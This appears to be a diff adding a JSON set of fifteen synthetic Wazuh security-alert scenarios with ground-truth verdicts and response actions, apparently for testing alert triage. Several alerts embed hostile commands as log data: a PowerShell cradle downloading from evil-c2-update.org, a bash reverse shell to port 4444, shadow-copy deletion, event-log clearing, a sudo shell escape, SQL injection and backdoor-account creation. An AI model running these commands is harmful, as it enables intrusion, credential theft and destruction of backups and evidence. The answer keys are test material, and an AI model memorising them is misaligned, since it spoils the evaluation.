@@ -1,0 +1,657 @@
+[
+  {
+    "id": "scenario_01_ssh_brute_force",
+    "name": "SSH Brute Force Authentication Attack",
+    "tactic": "Credential Access",
+    "description": "Multiple repeated SSH authentication failures from external IP targeting root and admin accounts followed by successful login.",
+    "wazuh_alert": {
+      "timestamp": "2026-11-11T03:14:22.000+0000",
+      "rule": {
+        "level": 10,
+        "description": "sshd: brute force attack trying to get access to the system.",
+        "id": "5710",
+        "firedtimes": 15,
+        "groups": ["syslog", "sshd", "authentication_failures"],
+        "mitre": {
+          "id": ["T1110"],
+          "tactic": ["Credential Access"],
+          "technique": ["Brute Force"]
+        }
+      },
+      "agent": {
+        "id": "001",
+        "name": "ubuntu-production-web",
+        "ip": "10.0.1.15"
+      },
+      "data": {
+        "srcip": "198.51.100.45",
+        "dstuser": "root"
+      },
+      "decoder": {
+        "name": "sshd"
+      },
+      "location": "/var/log/auth.log",
+      "full_log": "Nov 11 03:14:22 ubuntu-production-web sshd[28471]: Failed password for root from 198.51.100.45 port 49152 ssh2"
+    },
+    "ground_truth": {
+      "expected_verdict": "True Positive",
+      "expected_severity": "High",
+      "mitre_technique_id": "T1110",
+      "mitre_technique_name": "Brute Force",
+      "expected_affected_assets": ["ubuntu-production-web", "10.0.1.15"],
+      "expected_iocs": ["198.51.100.45", "root"],
+      "recommended_action": "Block source IP 198.51.100.45 on firewall, disable SSH root password login, enforce key-based authentication."
+    }
+  },
+  {
+    "id": "scenario_02_powershell_download_c2",
+    "name": "Malicious PowerShell Download and Execution",
+    "tactic": "Execution",
+    "description": "Encoded PowerShell execution with WebClient downloading a payload from an external domain.",
+    "wazuh_alert": {
+      "timestamp": "2026-11-11T04:22:10.000+0000",
+      "rule": {
+        "level": 12,
+        "description": "PowerShell suspicious download and execution cradles detected",
+        "id": "91802",
+        "firedtimes": 1,
+        "groups": ["windows", "sysmon", "powershell"],
+        "mitre": {
+          "id": ["T1059.001"],
+          "tactic": ["Execution"],
+          "technique": ["Command and Scripting Interpreter: PowerShell"]
+        }
+      },
+      "agent": {
+        "id": "002",
+        "name": "win-desktop-finance01",
+        "ip": "10.0.2.24"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "commandLine": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil-c2-update.org/payload.ps1')\"",
+            "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+            "subjectUserName": "alice.accountant"
+          }
+        }
+      },
+      "location": "Microsoft-Windows-Sysmon/Operational",
+      "full_log": "Sysmon Event 1: Process Creation: powershell.exe spawned by EXCEL.EXE executing remote script download."
+    },
+    "ground_truth": {
+      "expected_verdict": "True Positive",
+      "expected_severity": "Critical",
+      "mitre_technique_id": "T1059.001",
+      "mitre_technique_name": "PowerShell",
+      "expected_affected_assets": ["win-desktop-finance01", "10.0.2.24"],
+      "expected_iocs": ["alice.accountant", "http://evil-c2-update.org/payload.ps1", "powershell.exe"],
+      "recommended_action": "Isolate host win-desktop-finance01 immediately from network, kill powershell process, block domain evil-c2-update.org on proxy/DNS."
+    }
+  },
+  {
+    "id": "scenario_03_vssadmin_shadow_delete",
+    "name": "Volume Shadow Deletion via Vssadmin (Ransomware Precursor)",
+    "tactic": "Impact",
+    "description": "Execution of vssadmin.exe delete shadows /all /quiet to inhibit system backup recovery.",
+    "wazuh_alert": {
+      "timestamp": "2026-11-11T05:01:45.000+0000",
+      "rule": {
+        "level": 14,
+        "description": "Shadow copy deletion using vssadmin.exe detected (Ransomware behavior)",
+        "id": "92015",
+        "firedtimes": 1,
+        "groups": ["windows", "sysmon", "ransomware"],
+        "mitre": {
+          "id": ["T1490"],
+          "tactic": ["Impact"],
+          "technique": ["Inhibit System Recovery"]
+        }
+      },
+      "agent": {
+        "id": "003",
+        "name": "win-fileserver01",
+        "ip": "10.0.1.5"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "image": "C:\\Windows\\System32\\vssadmin.exe",
+            "commandLine": "vssadmin.exe delete shadows /all /quiet",
+            "parentImage": "C:\\Windows\\Temp\\update_service.exe",
+            "targetUserName": "SYSTEM"
+          }
+        }
+      },
+      "location": "Microsoft-Windows-Sysmon/Operational",
+      "full_log": "Sysmon Event 1: vssadmin.exe executed with delete shadows argument by suspicious temp executable."
+    },
+    "ground_truth": {
+      "expected_verdict": "True Positive",
+      "expected_severity": "Critical",
+      "mitre_technique_id": "T1490",
+      "mitre_technique_name": "Inhibit System Recovery",
+      "expected_affected_assets": ["win-fileserver01", "10.0.1.5"],
+      "expected_iocs": ["vssadmin.exe", "update_service.exe", "SYSTEM"],
+      "recommended_action": "Emergency network containment of win-fileserver01, suspend file sharing services, preserve RAM for forensics."
+    }
+  },
+  {
+    "id": "scenario_04_mimikatz_lsass_dump",
+    "name": "OS Credential Dumping: LSASS Memory Access",
+    "tactic": "Credential Access",
+    "description": "Non-system process requesting full memory read handle on lsass.exe to extract credentials.",
+    "wazuh_alert": {
+      "timestamp": "2026-11-11T05:45:12.000+0000",
+      "rule": {
+        "level": 13,
+        "description": "Process accessed LSASS memory handle with PROCESS_VM_READ access rights",
+        "id": "92100",
+        "firedtimes": 1,
+        "groups": ["windows", "sysmon", "credential_dumping"],
+        "mitre": {
+          "id": ["T1003.001"],
+          "tactic": ["Credential Access"],
+          "technique": ["LSASS Memory"]
+        }
+      },
+      "agent": {
+        "id": "002",
+        "name": "win-desktop-finance01",
+        "ip": "10.0.2.24"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "sourceImage": "C:\\Users\\alice.accountant\\AppData\\Local\\Temp\\mimi.exe",
+            "targetImage": "C:\\Windows\\System32\\lsass.exe",
+            "grantedAccess": "0x1010",
+            "targetUserName": "alice.accountant"
+          }
+        }
+      },
+      "location": "Microsoft-Windows-Sysmon/Operational",
+      "full_log": "Sysmon Event 10: Process mimi.exe opened handle to lsass.exe with VM read permissions."
+    },
+    "ground_truth": {
+      "expected_verdict": "True Positive",
+      "expected_severity": "Critical",
+      "mitre_technique_id": "T1003.001",
+      "mitre_technique_name": "LSASS Memory",
+      "expected_affected_assets": ["win-desktop-finance01", "10.0.2.24"],
+      "expected_iocs": ["mimi.exe", "lsass.exe", "alice.accountant"],
+      "recommended_action": "Isolate host, terminate mimi.exe, initiate domain-wide password reset for any accounts active on this host, review Kerberos TGT activity."
+    }
+  },
+  {
+    "id": "scenario_05_sql_injection",
+    "name": "Web Application SQL Injection Exploit",
+    "tactic": "Initial Access",
+    "description": "Attacker injecting SQL syntax into public web endpoint parameter seeking database schema disclosure.",
+    "wazuh_alert": {
+      "timestamp": "2026-11-11T06:12:30.000+0000",
+      "rule": {
+        "level": 8,
+        "description": "Web server: SQL injection attempt detected in HTTP GET query string.",
+        "id": "31101",
+        "firedtimes": 4,
+        "groups": ["web", "accesslog", "attack"],
+        "mitre": {
+          "id": ["T1190"],
+          "tactic": ["Initial Access"],
+          "technique": ["Exploit Public-Facing Application"]
+        }
+      },
+      "agent": {
+        "id": "001",
+        "name": "ubuntu-production-web",
+        "ip": "10.0.1.15"
+      },
+      "data": {
+        "srcip": "203.0.113.88",
+        "command": "GET /products.php?id=1' UNION SELECT 1,username,password_hash FROM users-- HTTP/1.1"
+      },
+      "location": "/var/log/nginx/access.log",
+      "full_log": "203.0.113.88 - - [11/Nov/2026:06:12:30 +0000] \"GET /products.php?id=1%27%20UNION%20SELECT%201,username,password_hash%20FROM%20users-- HTTP/1.1\" 200 4521"
+    },
+    "ground_truth": {
+      "expected_verdict": "True Positive",
+      "expected_severity": "High",
+      "mitre_technique_id": "T1190",
+      "mitre_technique_name": "Exploit Public-Facing Application",
+      "expected_affected_assets": ["ubuntu-production-web", "10.0.1.15"],
+      "expected_iocs": ["203.0.113.88", "/products.php"],
+      "recommended_action": "Block 203.0.113.88 on WAF, check database query logs for data exfiltration, sanitize SQL queries using parameterized statements."
+    }
+  },
+  {
+    "id": "scenario_06_webshell_creation",
+    "name": "Web Shell Upload and Persistence in Webroot",
+    "tactic": "Persistence",
+    "description": "File integrity monitoring alert: new PHP script with system execution functions dropped into /var/www/html/uploads.",
+    "wazuh_alert": {
+      "timestamp": "2026-11-11T06:50:00.000+0000",
+      "rule": {
+        "level": 11,
+        "description": "File added to web directory with PHP execution markers (potential web shell)",
+        "id": "31502",
+        "firedtimes": 1,
+        "groups": ["syscheck", "fim", "webshell"],
+        "mitre": {
+          "id": ["T1505.003"],
+          "tactic": ["Persistence"],
+          "technique": ["Server Software Component: Web Shell"]
+        }
+      },
+      "agent": {
+        "id": "001",
+        "name": "ubuntu-production-web",
+        "ip": "10.0.1.15"
+      },
+      "data": {
+        "file_path": "/var/www/html/uploads/shell.php",
+        "file_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+        "dstuser": "www-data"
+      },
+      "location": "syscheck",
+      "full_log": "File '/var/www/html/uploads/shell.php' added. Mode: regular, size: 1420 bytes, user: www-data"
+    },
+    "ground_truth": {
+      "expected_verdict": "True Positive",
+      "expected_severity": "High",
+      "mitre_technique_id": "T1505.003",
+      "mitre_technique_name": "Web Shell",
+      "expected_affected_assets": ["ubuntu-production-web", "10.0.1.15"],
+      "expected_iocs": ["/var/www/html/uploads/shell.php", "www-data", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"],
+      "recommended_action": "Quarantine /var/www/html/uploads/shell.php, disable script execution in uploads directory, inspect web server access logs for POST requests."
+    }
+  },
+  {
+    "id": "scenario_07_sudo_privilege_escalation",
+    "name": "Unauthorized Sudo Privilege Escalation",
+    "tactic": "Privilege Escalation",
+    "description": "Low-privilege user attempting unauthorized root commands using sudo without password or via known SUID binary.",
+    "wazuh_alert": {
+      "timestamp": "2026-11-11T07:15:42.000+0000",
+      "rule": {
+        "level": 9,
+        "description": "User executed sudo command with root privileges for unauthorized binary",
+        "id": "5404",
+        "firedtimes": 2,
+        "groups": ["syslog", "sudo", "privilege_escalation"],
+        "mitre": {
+          "id": ["T1548.003"],
+          "tactic": ["Privilege Escalation"],
+          "technique": ["Sudo and Sudo Caching"]
+        }
+      },
+      "agent": {
+        "id": "001",
+        "name": "ubuntu-production-web",
+        "ip": "10.0.1.15"
+      },
+      "data": {
+        "srcuser": "guest_user",
+        "command": "/usr/bin/find . -exec /bin/sh -p ; -quit",
+        "dstuser": "root"
+      },
+      "location": "/var/log/auth.log",
+      "full_log": "sudo: guest_user : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh -p \\; -quit"
+    },
+    "ground_truth": {
+      "expected_verdict": "True Positive",
+      "expected_severity": "High",
+      "mitre_technique_id": "T1548.003",
+      "mitre_technique_name": "Sudo and Sudo Caching",
+      "expected_affected_assets": ["ubuntu-production-web", "10.0.1.15"],
+      "expected_iocs": ["guest_user", "/usr/bin/find", "root"],
+      "recommended_action": "Terminate session pts/0, lock guest_user account, audit /etc/sudoers file for misconfigurations."
+    }
+  },
+  {
+    "id": "scenario_08_local_admin_account_creation",
+    "name": "Rogue Local Administrator Account Created",
+    "tactic": "Persistence",
+    "description": "Net user command executed by attacker to create local backdoor user and add it to Administrators group.",
+    "wazuh_alert": {
+      "timestamp": "2026-11-11T08:02:19.000+0000",
+      "rule": {
+        "level": 10,
+        "description": "New local user account created and added to Administrators group",
+        "id": "60100",
+        "firedtimes": 1,
+        "groups": ["windows", "account_management"],
+        "mitre": {
+          "id": ["T1136.001"],
+          "tactic": ["Persistence"],
+          "technique": ["Local Account"]
+        }
+      },
+      "agent": {
+        "id": "003",
+        "name": "win-fileserver01",
+        "ip": "10.0.1.5"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "commandLine": "net user support_admin P@ssw0rd2026! /add && net localgroup Administrators support_admin /add",
+            "image": "C:\\Windows\\System32\\net.exe",
+            "subjectUserName": "bob_operator"
+          }
+        }
+      },
+      "location": "Security",
+      "full_log": "Event 4720: A user account was created: Account Name: support_admin by bob_operator."
+    },
+    "ground_truth": {
+      "expected_verdict": "True Positive",
+      "expected_severity": "High",
+      "mitre_technique_id": "T1136.001",
+      "mitre_technique_name": "Local Account",
+      "expected_affected_assets": ["win-fileserver01", "10.0.1.5"],
+      "expected_iocs": ["support_admin", "bob_operator", "net.exe"],
+      "recommended_action": "Disable support_admin immediately, revoke administrative rights, investigate session of bob_operator."
+    }
+  },
+  {
+    "id": "scenario_09_ransomware_mass_encryption",
+    "name": "Ransomware File Encryption Activity",
+    "tactic": "Impact",
+    "description": "Rapid modification and deletion of multiple file extensions with suspicious .locked extension appended.",
+    "wazuh_alert": {
+      "timestamp": "2026-11-11T08:33:05.000+0000",
+      "rule": {
+        "level": 14,
+        "description": "Mass file renaming and ransomware extension (.locked) pattern detected",
+        "id": "92500",
+        "firedtimes": 25,
+        "groups": ["windows", "sysmon", "ransomware"],
+        "mitre": {
+          "id": ["T1486"],
+          "tactic": ["Impact"],
+          "technique": ["Data Encrypted for Impact"]
+        }
+      },
+      "agent": {
+        "id": "003",
+        "name": "win-fileserver01",
+        "ip": "10.0.1.5"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "image": "C:\\Windows\\Temp\\cryptolocker.exe",
+            "targetFilename": "D:\\SharedData\\Finance\\Q3_Financials.xlsx.locked",
+            "subjectUserName": "SYSTEM"
+          }
+        }
+      },
+      "location": "Microsoft-Windows-Sysmon/Operational",
+      "full_log": "Sysmon Event 11: File create/modify: D:\\SharedData\\Finance\\Q3_Financials.xlsx.locked by cryptolocker.exe."
+    },
+    "ground_truth": {
+      "expected_verdict": "True Positive",
+      "expected_severity": "Critical",
+      "mitre_technique_id": "T1486",
+      "mitre_technique_name": "Data Encrypted for Impact",
+      "expected_affected_assets": ["win-fileserver01", "10.0.1.5"],
+      "expected_iocs": ["cryptolocker.exe", ".locked", "SYSTEM"],
+      "recommended_action": "Isolate win-fileserver01 from LAN, kill cryptolocker.exe process tree, unmount backup volumes, prepare clean recovery."
+    }
+  },
+  {
+    "id": "scenario_10_network_port_scan",
+    "name": "Nmap Network Reconnaissance / SYN Port Scan",
+    "tactic": "Discovery",
+    "description": "Single external host initiating rapid sequential TCP SYN packets across hundreds of destination ports.",
+    "wazuh_alert": {
+      "timestamp": "2026-11-11T09:10:00.000+0000",
+      "rule": {
+        "level": 7,
+        "description": "Host scanned multiple closed TCP ports in short window (Nmap SYN scan)",
+        "id": "25002",
+        "firedtimes": 80,
+        "groups": ["firewall", "ids", "reconnaissance"],
+        "mitre": {
+          "id": ["T1046"],
+          "tactic": ["Discovery"],
+          "technique": ["Network Service Discovery"]
+        }
+      },
+      "agent": {
+        "id": "001",
+        "name": "ubuntu-production-web",
+        "ip": "10.0.1.15"
+      },
+      "data": {
+        "srcip": "185.220.101.5",
+        "dstip": "10.0.1.15"
+      },
+      "location": "/var/log/ufw.log",
+      "full_log": "[UFW BLOCK] IN=eth0 OUT= SRC=185.220.101.5 DST=10.0.1.15 PROTO=TCP SPT=54321 DPT=445"
+    },
+    "ground_truth": {
+      "expected_verdict": "True Positive",
+      "expected_severity": "Medium",
+      "mitre_technique_id": "T1046",
+      "mitre_technique_name": "Network Service Discovery",
+      "expected_affected_assets": ["ubuntu-production-web", "10.0.1.15"],
+      "expected_iocs": ["185.220.101.5"],
+      "recommended_action": "Add 185.220.101.5 to perimeter firewall blocklist, ensure all non-essential ports remain closed."
+    }
+  },
+  {
+    "id": "scenario_11_reverse_shell_outbound",
+    "name": "Interactive Reverse TCP Shell Established",
+    "tactic": "Execution",
+    "description": "Outbound interactive bash shell piped directly to external TCP socket on port 4444.",
+    "wazuh_alert": {
+      "timestamp": "2026-11-11T09:40:15.000+0000",
+      "rule": {
+        "level": 13,
+        "description": "Bash shell spawned with network socket file descriptor redirect (Reverse Shell)",
+        "id": "51001",
+        "firedtimes": 1,
+        "groups": ["syslog", "auditd", "command_execution"],
+        "mitre": {
+          "id": ["T1059.004"],
+          "tactic": ["Execution"],
+          "technique": ["Unix Shell"]
+        }
+      },
+      "agent": {
+        "id": "001",
+        "name": "ubuntu-production-web",
+        "ip": "10.0.1.15"
+      },
+      "data": {
+        "command": "bash -i >& /dev/tcp/198.51.100.99/4444 0>&1",
+        "dstip": "198.51.100.99",
+        "dstuser": "www-data",
+        "process": "/bin/bash"
+      },
+      "location": "/var/log/audit/audit.log",
+      "full_log": "type=EXECVE msg=audit(1731318015.123:451): argc=3 a0=\"bash\" a1=\"-i\" a2=\">& /dev/tcp/198.51.100.99/4444 0>&1\""
+    },
+    "ground_truth": {
+      "expected_verdict": "True Positive",
+      "expected_severity": "Critical",
+      "mitre_technique_id": "T1059.004",
+      "mitre_technique_name": "Unix Shell",
+      "expected_affected_assets": ["ubuntu-production-web", "10.0.1.15"],
+      "expected_iocs": ["198.51.100.99:4444", "/bin/bash", "www-data"],
+      "recommended_action": "Terminate reverse shell PID, sever network connection to 198.51.100.99, inspect web app for remote code execution."
+    }
+  },
+  {
+    "id": "scenario_12_clear_event_logs",
+    "name": "Indicator Removal: Windows Event Log Cleared",
+    "tactic": "Defense Evasion",
+    "description": "Attacker clearing the Windows Security event log using wevtutil command to destroy forensics evidence.",
+    "wazuh_alert": {
+      "timestamp": "2026-11-11T10:15:33.000+0000",
+      "rule": {
+        "level": 12,
+        "description": "Windows Security event log was cleared using wevtutil or API",
+        "id": "92200",
+        "firedtimes": 1,
+        "groups": ["windows", "security", "defense_evasion"],
+        "mitre": {
+          "id": ["T1070.001"],
+          "tactic": ["Defense Evasion"],
+          "technique": ["Clear Windows Event Logs"]
+        }
+      },
+      "agent": {
+        "id": "002",
+        "name": "win-desktop-finance01",
+        "ip": "10.0.2.24"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "image": "C:\\Windows\\System32\\wevtutil.exe",
+            "commandLine": "wevtutil.exe cl Security",
+            "subjectUserName": "alice.accountant"
+          }
+        }
+      },
+      "location": "Security",
+      "full_log": "Event 1102: The audit log was cleared by user alice.accountant using wevtutil.exe."
+    },
+    "ground_truth": {
+      "expected_verdict": "True Positive",
+      "expected_severity": "Critical",
+      "mitre_technique_id": "T1070.001",
+      "mitre_technique_name": "Clear Windows Event Logs",
+      "expected_affected_assets": ["win-desktop-finance01", "10.0.2.24"],
+      "expected_iocs": ["wevtutil.exe", "alice.accountant"],
+      "recommended_action": "Freeze workstation win-desktop-finance01, retrieve centralized SIEM logs prior to deletion, interview user regarding command."
+    }
+  },
+  {
+    "id": "scenario_13_benign_cron_backup",
+    "name": "Benign Baseline: Nightly Scheduled System Backup",
+    "tactic": "Execution",
+    "description": "Scheduled cron job running tar / rsync to archive /etc and /var/log to external NAS, triggering high disk read alert.",
+    "wazuh_alert": {
+      "timestamp": "2026-11-11T02:00:01.000+0000",
+      "rule": {
+        "level": 3,
+        "description": "Scheduled automated backup script executed by root cron",
+        "id": "5301",
+        "firedtimes": 1,
+        "groups": ["syslog", "cron", "maintenance"],
+        "mitre": {
+          "id": ["T1053.003"],
+          "tactic": ["Execution"],
+          "technique": ["Cron"]
+        }
+      },
+      "agent": {
+        "id": "001",
+        "name": "ubuntu-production-web",
+        "ip": "10.0.1.15"
+      },
+      "data": {
+        "dstuser": "root",
+        "command": "/usr/local/bin/backup-nightly.sh"
+      },
+      "location": "/var/log/syslog",
+      "full_log": "CRON[1299]: (root) CMD (/usr/local/bin/backup-nightly.sh > /var/log/backup.log 2>&1)"
+    },
+    "ground_truth": {
+      "expected_verdict": "False Positive",
+      "expected_severity": "Low",
+      "mitre_technique_id": "T1053.003",
+      "mitre_technique_name": "Cron",
+      "expected_affected_assets": ["ubuntu-production-web"],
+      "expected_iocs": [],
+      "recommended_action": "Legitimate maintenance activity. Add /usr/local/bin/backup-nightly.sh to approved cron whitelist; close case as False Positive."
+    }
+  },
+  {
+    "id": "scenario_14_benign_vulnerability_scanner",
+    "name": "Benign Baseline: Approved Vulnerability Assessment Scan",
+    "tactic": "Discovery",
+    "description": "Internal Nessus vulnerability scanner connecting to multiple web endpoints during scheduled maintenance window.",
+    "wazuh_alert": {
+      "timestamp": "2026-11-11T01:30:00.000+0000",
+      "rule": {
+        "level": 3,
+        "description": "Multiple HTTP 404 and probe requests from vulnerability scanner signature",
+        "id": "25001",
+        "firedtimes": 40,
+        "groups": ["web", "accesslog", "scanner"],
+        "mitre": {
+          "id": ["T1595.002"],
+          "tactic": ["Reconnaissance"],
+          "technique": ["Vulnerability Scanning"]
+        }
+      },
+      "agent": {
+        "id": "001",
+        "name": "ubuntu-production-web",
+        "ip": "10.0.1.15"
+      },
+      "data": {
+        "srcip": "10.0.99.10",
+        "command": "GET /test-cgi/ HTTP/1.1 (Nessus Scanner Probe)"
+      },
+      "location": "/var/log/nginx/access.log",
+      "full_log": "10.0.99.10 - - [11/Nov/2026:01:30:00 +0000] \"GET /test-cgi/ HTTP/1.1\" 404 153 \"-\" \"Nessus-Scanner/10.5\""
+    },
+    "ground_truth": {
+      "expected_verdict": "False Positive",
+      "expected_severity": "Low",
+      "mitre_technique_id": "T1595.002",
+      "mitre_technique_name": "Vulnerability Scanning",
+      "expected_affected_assets": ["ubuntu-production-web"],
+      "expected_iocs": [],
+      "recommended_action": "Source IP 10.0.99.10 matches authorized internal SecOps vulnerability scanner. Activity occurred inside approved maintenance window. Close as False Positive."
+    }
+  },
+  {
+    "id": "scenario_15_benign_dev_api_test",
+    "name": "Benign Baseline: Internal Developer API Testing",
+    "tactic": "Credential Access",
+    "description": "Internal developer workstation sending invalid API keys during automated unit test suite execution.",
+    "wazuh_alert": {
+      "timestamp": "2026-11-11T10:05:00.000+0000",
+      "rule": {
+        "level": 3,
+        "description": "Repeated API authentication failures from internal workstation",
+        "id": "5711",
+        "firedtimes": 8,
+        "groups": ["api", "auth", "testing"],
+        "mitre": {
+          "id": ["T1110.001"],
+          "tactic": ["Credential Access"],
+          "technique": ["Password Guessing"]
+        }
+      },
+      "agent": {
+        "id": "001",
+        "name": "ubuntu-production-web",
+        "ip": "10.0.1.15"
+      },
+      "data": {
+        "srcip": "10.0.5.88",
+        "dstuser": "dev_test_svc"
+      },
+      "location": "/var/log/api-gateway.log",
+      "full_log": "AUTH_FAIL: Invalid token for dev_test_svc from internal host 10.0.5.88 (User-Agent: python-requests/pytest)"
+    },
+    "ground_truth": {
+      "expected_verdict": "False Positive",
+      "expected_severity": "Low",
+      "mitre_technique_id": "T1110.001",
+      "mitre_technique_name": "Password Guessing",
+      "expected_affected_assets": ["ubuntu-production-web"],
+      "expected_iocs": [],
+      "recommended_action": "Internal developer testing suite verified by User-Agent (pytest). No external breach attempt. Close case as False Positive."
+    }
+  }
+]
